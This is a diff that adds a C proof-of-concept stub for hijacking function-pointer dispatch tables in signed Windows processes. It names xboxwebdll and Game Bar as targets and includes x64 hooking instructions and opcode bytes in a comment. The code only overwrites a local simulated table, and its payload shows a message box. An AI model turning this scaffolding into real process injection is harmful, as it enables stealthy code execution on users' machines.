@@ -1,0 +1,86 @@
+// hijack_point_poc.c
+// C/ASM PoC stubs for hijacking trusted callback/function dispatch in signed Windows processes
+// Target: xboxwebdll & Gamebar injection vectors
+
+
+#include <windows.h>
+#include <stdio.h>
+
+
+// Define prototype of the hijacked function
+typedef void (*GhostCallback)(void);
+
+
+// Our payload - replace this with encrypted/encoded block
+void __stdcall GhostPayload() {
+MessageBoxA(NULL, "GhostPayload executed.", "PoC", MB_OK);
+}
+
+
+// Simulated vulnerable dispatch table from xboxwebdll memory region
+GhostCallback* GetDispatchTableBase() {
+// Placeholder for base of writable function pointer table
+static GhostCallback DispatchTable[3] = { 0 };
+return DispatchTable;
+}
+
+
+// Setup hijack (Phase 2)
+void PlantHijack() {
+GhostCallback* table = GetDispatchTableBase();
+
+
+// Assume memory is RW, simulating post-ResetNTPFN stosq region
+table[0] = GhostPayload; // hijack rcx slot
+table[1] = GhostPayload; // hijack rdx slot
+table[2] = GhostPayload; // hijack r8 slot
+
+
+printf("[+] GhostPayload planted into function table.\n");
+}
+
+
+// Trigger hijack (Phase 5)
+void TriggerCallback(unsigned int index) {
+GhostCallback* table = GetDispatchTableBase();
+if (index < 3 && table[index]) {
+printf("[*] Dispatching to GhostPayload via index %u...\n", index);
+table[index]();
+} else {
+printf("[-] Invalid or null callback index %u.\n", index);
+}
+}
+
+
+int main() {
+PlantHijack();
+
+
+// Emulate legitimate process callback invoking hijacked function
+TriggerCallback(0);
+TriggerCallback(1);
+TriggerCallback(2);
+
+
+return 0;
+}
+
+
+/*
+Assembly Hooking Concept (x64 inline):
+
+
+// Original
+mov rax, qword ptr [rip+Offset]
+mov [rcx], rax
+
+
+// Hijack
+mov rax, GhostPayload
+mov [rcx], rax
+
+
+Or inject directly:
+48 B8 <ptr to GhostPayload>
+48 89 01
+*/
